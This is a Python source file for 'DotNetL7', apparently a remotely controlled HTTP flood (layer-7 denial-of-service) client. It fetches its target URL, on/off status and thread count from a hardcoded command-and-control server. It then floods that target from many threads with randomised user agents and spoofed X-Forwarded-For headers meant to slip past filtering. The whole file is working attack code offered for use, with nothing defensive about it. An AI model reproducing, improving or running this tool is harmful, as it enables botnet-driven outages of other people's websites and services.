#!/usr/bin/python3

"""
Author: @r_RiX_x
Name: DotNetL7
Version: 1.1
"""

#define version installed
VERSION_INSTALLED = "1.1"

#import libs
import sys
import requests
import requests_html
import threading
from time import sleep as delay
from os import name as system_name
from os import getpid as process_id
from os import system as system_write
from random import choice as random_choice
from random import randint as random_integer
from configparser import ConfigParser

#main function that starts all
def main():
    global ATTACKING_STATUS, THREADS_COUNT, DELAY_BETWEEN_CONNECTIONS, RUNNING_THREADS, USER_AGENTS, VERSION_INSTALLED, GET_THREADS_COUNT

    #clear terminal
    system_write("cls" if system_name == "nt" else "clear")

    #print welcome text
    welcome_text = """
 ____      _   _____     _      __                       ___
|    \ ___| |_|   | |___| |_   |  |   ___ _ _ ___ ___ __|_  |
|  |  | . |  _| | | | -_|  _|  |  |__| .'| | | -_|  _|___|| |
|____/|___|_| |_|___|___|_|    |_____|__,|_  |___|_|      |_|
Author: @r_RiX_x                         |___|Version: {}
    """
    print(welcome_text.format(VERSION_INSTALLED))

    #catch errors
    try:

        #define threads count
        THREADS_COUNT = int(sys.argv[1])
        GET_THREADS_COUNT = False

    #use from script
    except:
        #define get threads count from control server
        GET_THREADS_COUNT = True

    #define thread variable to not catch error when it's none
    RUNNING_THREADS = 0

    #define user agents for requests
    USER_AGENTS = [
        "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 4.3; Nexus 7 Build/JSS15Q) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/92.0.4515.131 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (iPad; CPU OS 13_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/92.0.4515.131 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (X11; CrOS x86_64 10066.0.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36",
        "Mozilla/5.0 (Android 4.4; Mobile; rv:70.0) Gecko/70.0 Firefox/70.0",
        "Mozilla/5.0 (Android 4.4; Tablet; rv:70.0) Gecko/70.0 Firefox/70.0",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 8_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) FxiOS/1.0 Mobile/12F69 Safari/600.1.4",
        "Mozilla/5.0 (iPad; CPU iPhone OS 8_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) FxiOS/1.0 Mobile/12F69 Safari/600.1.4",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:70.0) Gecko/20100101 Firefox/70.0",
        "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:70.0) Gecko/20100101 Firefox/70.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.97 Safari/537.36 OPR/65.0.3467.48",
        "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.97 Safari/537.36 OPR/65.0.3467.48",
        "Opera/12.02 (Android 4.1; Linux; Opera Mobi/ADR-1111101157; U; en-US) Presto/2.9.201 Version/12.02",
        "Mozilla/5.0 (iPad; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Safari/605.1.15"
    ]

    #catch errors
    try:

        #update configuration
        while True:

            #start get_options function and print results
            get_options()
            print("Configuration successfully updated and applied")

            #check for starting
            if ATTACKING_STATUS == True and TARGET != None:

                #check for re-creating threads when needs less
                if THREADS_COUNT < RUNNING_THREADS:
                    #stop threads
                    ATTACKING_STATUS = False
                    while RUNNING_THREADS > THREADS_COUNT:
                        pass
                    ATTACKING_STATUS = True

                #create and start threads
                create_threads()

            #print threads results
            print("Threads: {}/{}".format(RUNNING_THREADS, THREADS_COUNT))

            #delay updating config to except too many incoming requests on control server
            delay(random_integer(15, 30))

    #catch, print error and exit
    except Exception as error:
        print("\nError: " + str(error) + "\n")
        manual_exit()

    #catch, print ctrl+c and exit
    except KeyboardInterrupt:
        print("\nCtrl+C\n")
        manual_exit()

#ctrl+c exit function
def manual_exit():

    #get pid and kill process manually
    system_write("TASKKILL /F /PID "+str(process_id()) if system_name == "nt" else "kill -9 "+str(process_id()))

#create threads function
def create_threads():
    global THREADS_COUNT, DELAY_BETWEEN_CONNECTIONS, RUNNING_THREADS

    #start threads
    for thread in range(THREADS_COUNT-RUNNING_THREADS):
        thread_object = threading.Thread(target=dos)
        thread_object.start()

        #add 1 to running threads variable
        RUNNING_THREADS += 1

        #make delay between each thread started
        delay(DELAY_BETWEEN_CONNECTIONS)

#get options from control server
def get_options():
    global ATTACKING_STATUS, TARGET, DELAY_BETWEEN_CONNECTIONS, SSL, HOST, VERSION_INSTALLED, GET_THREADS_COUNT, THREADS_COUNT

    #define control server
    control_server = "http://www.c0ntr0lp4n3l.eu5.net/CONFIG.x"

    #get configurations
    try:
        config_request = requests.get(control_server, allow_redirects=False, timeout=30)
        configurations = config_request.content.decode("utf-8")
    #pass when timed out
    except:
        pass

    #define and read configuration file
    config = ConfigParser()
    config.read_string(configurations)

    #check actual version
    VERSION = str(config["Configuration"]["VERSION"].replace("\"", ""))
    #compare script versions
    if VERSION != VERSION_INSTALLED:
        #print about update exit script to update
        print("\nNew update available!\n")
        manual_exit()
    #define configurations
    ATTACKING_STATUS = config["Configuration"]["ATTACKING_STATUS"].replace("\"", "")
    #check for statement and set to bool type
    if ATTACKING_STATUS.lower() == "true":
        ATTACKING_STATUS = True
    else:
        ATTACKING_STATUS = False
    #check for valid target
    TARGET = str(config["Configuration"]["TARGET_URL"].replace("\"", ""))
    if "https://" not in TARGET and "http://" not in TARGET:
        TARGET = None
        ATTACKING_STATUS = False
        while RUNNING_THREADS != 0:
            pass
    if "https://" in TARGET:
        SSL = "https", "on"
        HOST = TARGET.replace("https://", "").split("/")[0]
    else:
        SSL = "http", "off"
        HOST = TARGET.replace("http://", "").split("/")[0]
    #if threads count not set manually - get it from server
    if GET_THREADS_COUNT:
        THREADS_COUNT = int(config["Configuration"]["THREADS_COUNT"].replace("\"", ""))
    DELAY_BETWEEN_CONNECTIONS = int(config["Configuration"]["DELAY_BETWEEN_CONNECTIONS"].replace("\"", ""))/1000

#dos target function
def dos():
    global ATTACKING_STATUS, TARGET, DELAY_BETWEEN_CONNECTIONS, RUNNING_THREADS, USER_AGENTS, SSL, HOST

    #do while status is active
    while ATTACKING_STATUS:

        #catch error
        try:

            #catch errors
            try:

                #create requests session and define user agent
                worker =  requests_html.HTMLSession()
                random_ip = str(random_integer(1, 255)) + "." + str(random_integer(1, 255)) + "." + str(random_integer(1, 255)) + "." + str(random_integer(1, 255))
                headers = { "Accept": "*/*",
                            "Accept-Encoding": "*",
                            "Accept-Language": "*",
                            "X-Forwarded-For": random_ip,
                            "X-Forwarded-Host": HOST,
                            "X-Url-Scheme": SSL[0],
                            "X-Forwarded-Proto": SSL[0],
                            "X-Forwarded-Protocol": SSL[0],
                            "X-Forwarded-Ssl": SSL[1],
                            "Front-End-Https": SSL[1],
                            "User-Agent": random_choice(USER_AGENTS),
                            "Connection": "keep-alive"}
                while ATTACKING_STATUS:

                    #catch errors
                    try:

                        #send http request and print results
                        worker.get( TARGET, headers=headers,
                                    allow_redirects=True, timeout=30)

                    #catch reseted connection error
                    except:

                        #close session, make delay and break cycle to create new
                        worker.close()
                        delay(DELAY_BETWEEN_CONNECTIONS)
                        break

            #catch timeouted connection error
            except:

                #close session and start again cycle to create new
                worker.close()
                continue

        #catch some error with closing socket what's none
        except:

            #pass the error
            continue

    #substract 1 from running threads count and exit thread
    RUNNING_THREADS -= 1
    sys.exit(0)

if __name__ == "__main__":
    #start main functions if script running as main
    main()
